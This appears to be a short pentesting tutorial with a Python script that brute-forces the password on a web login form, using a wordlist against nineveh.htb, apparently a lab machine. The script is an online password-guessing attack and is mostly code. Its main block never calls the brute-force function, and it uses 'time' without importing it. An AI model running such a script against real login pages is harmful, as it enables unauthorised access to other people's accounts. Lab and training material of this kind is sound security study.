# Pentesting with Python3

## HTTP Login Bruteforce

### Password Bruteforce

A very simple password brute force script on HTTP non SSL/TLS can be the following:

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import urllib3
from pwn import *

# Disable Certificate Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Globals
login_url = 'https://nineveh.htb/db/index.php'

# Password Wordlist as Read Only
f = open("passwords.txt", "r")

# Exit
def def_handler(sig, frame):
    print("\n\nExiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Bruteforce
def bruteForce():
    # Session
    s = requests.Session()
    # Read Password Lines from passwords.txt
    passwords = f.readlines()
      
    for password in passwords:
        
        # Login Parameters
        login_data = {
            'password': password.rstrip(),
            'login': "Log+In",
            'proc_login': "true"
        }

        p1.status("Testing with the password %s" %password)
        
        # Send the data in POST request and don't verify certificates
        r = s.post(login_url, data=login_data, verify=False)
        
        # If the string 'Incorrect password' is not in the HTTP response then print xyz
        if 'Incorrect password.' not in r.text:
            p1.success("The correct passsword is %s" %password)
            sys.exit(0)

if __name__ == '__main__':
    p1 = log.progress("Bruteforce")
    p1.status("Bruteforcing")
    time.sleep(2)
```

